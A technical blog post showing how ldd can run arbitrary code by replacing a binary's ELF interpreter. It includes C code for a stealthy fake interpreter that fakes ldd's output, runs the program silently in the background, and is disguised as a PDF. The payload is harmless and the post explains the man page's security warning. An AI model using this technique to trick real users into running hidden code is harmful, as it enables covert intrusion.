---
layout: post
title: Arbitrary Code Execution with ldd
date: 2016-04-15 19:36:20
categories:
---
First off I think it is important to set expectations. This is not about any kind of vulnerability or bug in [ldd](https://linux.die.net/man/1/ldd). Everything mentioned here is known, documented and by design. If you still don't know where this is going, now would be a good time to read the ldd man page:

    DESCRIPTION
         ldd  prints the shared objects (shared libraries) required by each
         program or shared object specified on the command line.  An  exam‐
         ple of its use and output is the following:

         $ ldd /bin/ls
                 linux-vdso.so.1 (0x00007ffcc3563000)
                 libselinux.so.1 => /lib64/libselinux.so.1 (0x00007f87e5459000)
                 libcap.so.2 => /lib64/libcap.so.2 (0x00007f87e5254000)
    (...)
    Security
         Be aware that in some circumstances (e.g., where the program spec‐
         ifies an ELF interpreter other than ld-linux.so), some versions of
         ldd may attempt to obtain the dependency information by attempting
         to directly execute the program (which may lead to  the  execution
         of  whatever code is defined in the program's ELF interpreter, and
         perhaps to execution of the program  itself).   Thus,  you  should
         never employ ldd on an untrusted executable, since this may result
         in the execution of arbitrary  code.

I don't know about you but that sounds like a challenge to me! First some background.

Interpreter? I thought ELFs were already compiled
===

Running a tool like `readelf` or `objdump` on a dynamically linked ELF file like `/bin/sh`, you will see an `INTERP` program header. This points to the `.interp` section which holds a string value, usually something like `/lib64/ld-linux-x86-64.so.2` on AMD64 Linux. Another word for this "interpreter" is dynamic linker. It is another ELF executable, responsible for finding shared library dependencies for this ELF executable and loading them into memory. In other words it is code that runs before the main executable.

    $  readelf --program-headers /bin/sh
    Elf file type is EXEC (Executable file)
    Entry point 0x4094a0
    There are 10 program headers, starting at offset 64

    Program Headers:
      Type           Offset             VirtAddr           PhysAddr
    ...
      INTERP         0x0000000000000270 0x0000000000400270 0x0000000000400270
                     0x000000000000001c 0x000000000000001c  R      1
          [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
    ...

    $  readelf --sections /bin/sh
    There are 29 section headers, starting at offset 0xca088:

    Section Headers:
      [Nr] Name              Type             Address           Offset
           Size              EntSize          Flags  Link  Info  Align
    ...
      [ 1] .interp           PROGBITS         0000000000400270  00000270
           000000000000001c  0000000000000000   A       0     0     1
    ...

The contents of the `.interp` section is literally an ASCII string of the file path to the interpreter. The output of `readelf` told us that this section can be found at offset 0x270 of the ELF file and is 0x1c bytes long.

    $ xxd -s +0x270 -l 0x1c /bin/sh
    00000270: 2f6c 6962 3634 2f6c 642d 6c69 6e75 782d  /lib64/ld-linux-
    00000280: 7838 362d 3634 2e73 6f2e 3200            x86-64.so.2.

Note that the dot at the end after the 2 is simply the way `xxd` represents non-printable characters, in this case 0x00 (the string terminator in C).

Contrast this with a `static` ELF executable such as `busybox` which has no `.interp` section.

How To
===
One way to change the ELF interpreter is by compiling the source to an object file and then manually invoking the linker with the `-dynmic-linker` switch.

    $  cat hello_world.c
    #include <stdio.h>

    int main()
    {
      printf("hello world\n");
      return 3;
    }

    $  cat hello_satan.c
    #include <stdio.h>

    int main()
    {
      printf("Hello Satan\n");
      return 66;
    }


    $ clang hello_world.c
    $ ./a.out
    hello world

    $  ldd a.out
            linux-vdso.so.1 (0x00007fff9df58000)
            libc.so.6 => /lib64/libc.so.6 (0x00007f4274755000)
            /lib64/ld-linux-x86-64.so.2 (0x00007f4274af5000)

    # Note `-static` is important
    $ clang -static hello_satan.c -o hello_satan
    $ clang -c hello_world.c
    $ ld -lc hello_world.o -dynamic-linker hello_satan
    $  ./a.out
    Hello Satan

    $  ldd a.out
    Hello Satan

Another way is to modify the `.interp` section of the ELF binary directly without recompilation. The easiest way to do this is with a simple tool called `patchelf`.

    $ patchelf --help
    syntax: patchelf
      [--set-interpreter FILENAME]
      [--print-interpreter]
      [--set-rpath RPATH]
      [--shrink-rpath]
      [--print-rpath]
      [--force-rpath]
      [--remove-needed LIBRARY]
      [--debug]
      [--version]
      FILENAME

    $ clang hello_world.c
    $ ./a.out
    hello world
    $ ldd a.out
            linux-vdso.so.1 (0x00007ffefafb0000)
            libc.so.6 => /lib64/libc.so.6 (0x00007faef1491000)
            /lib64/ld-linux-x86-64.so.2 (0x00007faef1831000)

    $ clang -static hello_satan.c -o hello_satan
    $ patchelf --set-interpreter hello_satan a.out

    $ ./a.out
    Hello Satan
    $ ldd a.out
    Hello Satan

Note that although section lengths are recorded in the ELF file, the string is still NUL terminated so manually clobbering the existing interpreter path with a shorter one without changing anything else also seems to work.

    $ clang hello_world.c

    $ xxd -s +0x270 -l 0x1c a.out
    00000270: 2f6c 6962 3634 2f6c 642d 6c69 6e75 782d  /lib64/ld-linux-
    00000280: 7838 362d 3634 2e73 6f2e 3200            x86-64.so.2.

    $ echo -ne "hello_satan\x00" | dd of=a.out seek=$((0x270)) bs=1 conv=notrunc

    $ xxd -s +0x270 -l 0x1c a.out
    00000270: 6865 6c6c 6f5f 7361 7461 6e00 6e75 782d  hello_satan.nux-
    00000280: 7838 362d 3634 2e73 6f2e 3200            x86-64.so.2.

    $ ./a.out
    Hello Satan
    $ ldd a.out
    Hello Satan

Note the usage of `$((0x270))` to convert the offset into decimal. Quite hilariously, `dd` will interpret the `x` as the multiplication symbol so offset `0x270` will be `0 * 270` or `0`.

Why does it work?
===
GNU `ldd` (part of `glibc`) is implemented as a shell script. If you can't figure out what it does just by looking at the code (or just want to double check because the GNU version is pretty messy), then invoke it with the [-x switch](http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_02_03.html).

    $ bash -x /usr/bin/ldd /bin/sh
    (...)
    ++ eval LD_TRACE_LOADED_OBJECTS=1 LD_WARN= LD_BIND_NOW= 'LD_LIBRARY_VERSION=$verify_out' LD_VERBOSE= '"$@"'
    (...)

This part is the secret sauce. It essentially runs the input file with some magic environmental variables set. In fact, only one of them seems to be important.

    $  LD_TRACE_LOADED_OBJECTS=1 /bin/sh
            linux-vdso.so.1 (0x000072c2f6338000)
            libreadline.so.6 => /lib64/libreadline.so.6 (0x000072c2f5ec6000)
            libncurses.so.5 => /lib64/libncurses.so.5 (0x000072c2f5c68000)
            libc.so.6 => /lib64/libc.so.6 (0x000072c2f58bc000)
            /lib64/ld-linux-x86-64.so.2 (0x000072c2f6118000)

From here you can hopefully see how by replacing the interpreter of the executable, any code could be run as a result of a user running `ldd` on an untrusted file.

Creating a Generic "Interpreter"
===
Ideally we we want our fake interpeter to figure out the path to the real system interpreter and use it to execute the original file. For stealth purposes it would be nice if it could output something similar looking to `ldd`'s real output. And maybe we can disguise it as an innocuous file so it is not obvious to the user that they are in fact in possession of 2 ELF files. And maybe we could get it to output a sensible looking error message if executed directly. That all seems simple enough.

Finding the Real System Interpreter
===
There are lots of tools for parsing ELF files and printing out all sorts of information about them. For our purposes, we are only interested in the interpreter field. We can knock together a simple function in ~50 lines of code. There is minimal error checking. It will not blow up in the case of reasonable errors like a file is does not exist or it is not dynsmaically linked but it will still choke on obviously malformed ELF files.

    #include <fcntl.h>
    #include <linux/elf.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/stat.h>

    char* get_elf_interpreter_from_filepath(const char *path);

    /* Input path to ELF file.
     * Return ELF interpreter as a heap allocated string or NULL on error.
     */
    char* get_elf_interpreter_from_filepath(const char *path)
    {
      int fd = open(path, O_RDONLY, 0);

      struct stat s;
      fstat(fd, &s);

      const char *file_start =
        (const char*)mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);

      /* This is mostly to protect against non-existent input file. */
      if (file_start == MAP_FAILED)
        return NULL;

      /* Not an ELF file or not 64 bit ELF. */
      if (strncmp(file_start, "\x7f""ELF", 4) != 0)
        return NULL;

      #define PARSE_AND_RETURN_INTERP(ElfN)                                        \
        const ElfN##_Ehdr *elf_header = (const ElfN##_Ehdr*)file_start;            \
        const ElfN##_Shdr *section_header =                                        \
          (const ElfN##_Shdr*)(file_start + elf_header->e_shoff);                  \
        const ElfN##_Shdr *interp_section = NULL;                                  \
                                                                                   \
        /* The sections are not in any particular order so we need to scan all. */ \
        for (size_t i = 0; i < elf_header->e_shnum; ++i) {                         \
                                                                                   \
          const char *section_name = file_start +                                  \
            section_header[elf_header->e_shstrndx].sh_offset +                     \
            section_header[i].sh_name;                                             \
                                                                                   \
          if (strncmp(".interp", section_name, strlen(".interp")) == 0) {          \
            interp_section = section_header + i;                                   \
            break;                                                                 \
          }                                                                        \
        }                                                                          \
                                                                                   \
        /* Statically linked ELF files won't have an interpreter. */               \
        if (!interp_section)                                                       \
          return NULL;                                                             \
                                                                                   \
        return strdup(file_start + interp_section->sh_offset);

      if (file_start[4] == ELFCLASS64) {
        PARSE_AND_RETURN_INTERP(Elf64)
      } else {
        PARSE_AND_RETURN_INTERP(Elf32)
      }
    }

ELF Parsing Details
===
You probably want to skip this part. I included it because understanding the ELF format sufficiently to extract this information was not trivial and this information might be useful to someone else trying to do a similar thing.

Given an input file it will attempt to `mmap` it. Return gracefully if that fails. Return gracefully if the 0x7fELF magic pattern is missing. Cast the `mmap`ed memory region to an ELF header struct. The `e_shoff` field holds the offset (in bytes) of the section header table from the start of the file. The section header table is simply an array of structs. We know how many there are from the `e_shnum` ELF header struct field.

Unfortunately these section headers are in no particular order so we need to loop through them until we find the interpreter one(if it exists). The `sh_name` field of each section header is not actually a string but an offset into another table called the section name string table. To locate this table we need to look at the `e_shstrndx` field of the ELF header. This is an index into the section headers array we are already iterating over `(¯\_(ツ)_/¯)`. The `sh_offset` field from this "section header" is the offset from the start of the file, in bytes to the start of the section name string table (you can verify this with a hex editor). Add the `sh_name` field of the current section header we are iterating over to this offset and we have the name of this section.

The only section we are interested is called `.interp`. Once we have found it, the `sh_offset` field from that section header holds the offset from the start of the file, in bytes, to the NUL terminated string that is the interpreter. Bare in mind that an ELF file without a `.interp` section is perfectly valid (statically linked).

Moving On
===
We can use this code as simply as

    char *interp = get_elf_interpreter_from_filepath("/bin/sh");
    printf("%s\n", interp);
    // --> /lib64/ld-linux-x86-64.so.2
    free(interp);

It is possible that a system does not have a /bin/sh or it is statically linked but you get the point.

Now that we know the path to a valid interpreter for this system we can use it to get the expected `ldd` output by invoking it with `LD_TRACE_LOADED_OBJECTS=1` as an environmental variable and our original executable as an argument.

    char *original = getenv("_");
    const char env[] = "LD_TRACE_LOADED_OBJECTS=1 ";
    const size_t len =  strlen(env) + strlen(interp) + 1 + strlen(original) + 1;
    char *cmd = malloc(len);

    strncat(cmd, env, len);
    strncat(cmd, interp, len);
    strncat(cmd, " ", len);
    strncat(cmd, original, len);

    FILE *f = popen(cmd, "r");
    char s[1024];
    while (fgets(s, 1024, f)) {
      char *ss = strrchr(s, '\n');
      printf("%s", s);
    }

    free(cmd);
    fclose(f);

Or you could just print out some hardcoded, sample output.

More importantly, we can also use the real system interpreter to execute our original executable using fork and exec.

    pid_t pid = fork();
    if (pid == 0) {
      close(1);
      close(2);
      char *original = getenv("_");
      char *args[] = {interp, original, NULL};
      execve(interp, args, NULL);
    }

It is important to use `fork` because the user will expect `ldd` to return straight away, but our malicious payload may not want to. It is important to use `execve` with a `NULL` environment because remember, it is the presence of certain environmental variables that causes the real ELF interpreter to print out dependencies instead of running the executable.

To understand why we need to close `stdin` and `stdout`, lets look at the `/usr/bin/ldd` source code:

    try_trace() (
      output=$(eval $add_env '"$@"' 2>&1; rc=$?; printf 'x'; exit $rc)
      rc=$?
      printf '%s' "${output%x}"
      return $rc
    )

Our fake interpreter will be invoked inside a subshell with the output captured and assigned to the variable `output`. This means `ldd` will wait around until `stdout` and `stderr` are closed before proceeding (which in the normal case is when the real ELF interpreter exits). If you comment out one of these `close()` lines from the fake ELF interpreter you will see `ldd` hang.

    †  clang -static hello_satan.c -o hello_satan
    †  clang hello_world.c -o hello_world
    †  patchelf --set-interpreter hello_satan hello_world
    †  ldd hello_world
            linux-vdso.so.1 (0x00006f59434ed000)
            libreadline.so.6 => /lib64/libreadline.so.6 (0x00006f594307b000)
            libncurses.so.5 => /lib64/libncurses.so.5 (0x00006f5942e1d000)
            libc.so.6 => /lib64/libc.so.6 (0x00006f5942a71000)
            /lib64/ld-linux-x86-64.so.2 (0x00006f59432cd000)
    †  ps -aux | grep hello
    user     27349  0.0  0.0   4100   740 pts/9    S    09:23   0:00 /lib64/ld-linux-x86-64.so.2 ./hello_world
    user     27359  0.0  0.1   8352  2100 pts/9    S+   09:23   0:00 grep --colour=auto hello

The main thing to point out here is that running `ldd` appears perfectly normal however a subsequent `ps -aux` shows us that `hello_world` is now secretly executing in the background.

Disguising the Fake Interpreter as a PDF
===
I found it surprisingly difficult to look for information on how to disguise an ELF as a PDF. Embarrassingly enough, the reason appears to be that it is so trivial that no one has bothered to write about it. Simpling `cat`ing a PDF to the end of an ELF file will do the trick.

This works because the ELF header specifies the length of the ELF file. Any bytes after that point are ignored. PDF on the other hand ignores everything up to a `%PDF` marker.

    $ cat hello_satan some_pdf_file.pdf > README.pdf
    $ patchelf --set-interpreter README.pdf hello_world
    $ ldd hello_world
            linux-vdso.so.1 (0x00006f59434ed000)
            libreadline.so.6 => /lib64/libreadline.so.6 (0x00006f594307b000)
            libncurses.so.5 => /lib64/libncurses.so.5 (0x00006f5942e1d000)
            libc.so.6 => /lib64/libc.so.6 (0x00006f5942a71000)
            /lib64/ld-linux-x86-64.so.2 (0x00006f59432cd000)
    $ ps -aux | grep hello
    user     27390  0.0  0.0   4100   700 pts/9    S    09:29   0:00 /lib64/ld-linux-x86-64.so.2 ./hello_world
    user     27400  0.0  0.1   8352  2116 pts/9    S+   09:29   0:00 grep --colour=auto hello

Conclusion
===
This is nothing new or groundbreaking but it is interesting how what seemed like a sensible idea in the 90s is seen as so blatantly a security hole now. It would be interesting to try to achieve code execution using only a single ELF file (or at least explain why that is not possible) but this post is long enough. Although distributing binaries along with accompanying READMEs is common practice it is not a particularly practical attack. It is still reason enough to heed the advice of the `ldd` man page; don't run `ldd` on untrusted binaries.
